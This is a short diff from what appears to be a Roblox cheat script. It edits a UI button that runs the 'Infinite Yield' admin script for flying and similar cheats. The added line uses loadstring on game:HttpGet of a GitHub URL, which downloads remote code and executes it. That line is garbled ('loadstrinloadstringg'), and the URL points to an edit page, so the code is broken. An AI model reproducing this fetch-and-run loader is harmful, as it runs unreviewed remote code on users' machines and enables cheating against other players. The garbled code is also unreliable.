@@ -294,7 +294,7 @@ UtilityGroup:AddButton({
     Text = 'Execute Infinite Yield',
     Tooltip = 'Executes the IY Admin Script. Can be used for fly and other stuff',
     Func = function()
-        loadstring
+        loadstrinloadstringg(game:HttpGet("https://github.com/WhixZ-H4x/soyy/edit/main/soyy",true))()
     end
 })
 
